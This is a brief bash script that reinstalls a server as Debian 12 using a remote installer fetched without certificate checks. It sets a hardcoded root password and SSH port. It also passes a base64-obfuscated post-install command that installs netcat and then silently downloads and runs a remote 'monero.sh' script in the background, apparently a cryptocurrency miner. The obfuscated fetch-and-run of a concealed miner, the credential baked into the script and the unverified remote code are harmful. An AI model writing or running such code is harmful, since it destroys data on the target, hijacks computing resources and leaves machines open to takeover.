#!/bin/bash

sleep 120
#sleep "$[od -An -N2 -i /dev/urandom % 10800 + 10800]"


bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "X.myxiao5566123" -port 2233 -cmd "IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAmJiBhcHQgaW5zdGFsbCAteSBzdWRvCnN1ZG8gYXB0IC1xcXkgdXBkYXRlID4vZGV2L251bGwgMj4mMSB8fCBhcHQgLXFxeSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxCnN1ZG8gYXB0IC1xcXkgaW5zdGFsbCB3Z2V0IHByb2NwcyBwc21pc2MgbHNvZiBjcm9uIGljdS1kZXZ0b29scyBuZXRjYXQtdHJhZGl0aW9uYWwgYmluZDktaG9zdCA+L2Rldi9udWxsIDI+JjEgfHwgYXB0IC1xcXkgaW5zdGFsbCB3Z2V0IHByb2NwcyBwc21pc2MgbHNvZiBjcm9uIGljdS1kZXZ0b29scyBuZXRjYXQtdHJhZGl0aW9uYWwgYmluZDktaG9zdCA+L2Rldi9udWxsIDI+JjEKYmFzaCA8KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaWJ4bnh1L3poaWdlbmduaWFvL3JlZnMvaGVhZHMvbWFpbi9tb25lcm8uc2gpID4vZGV2L251bGwgMj4mMSAmCg=="
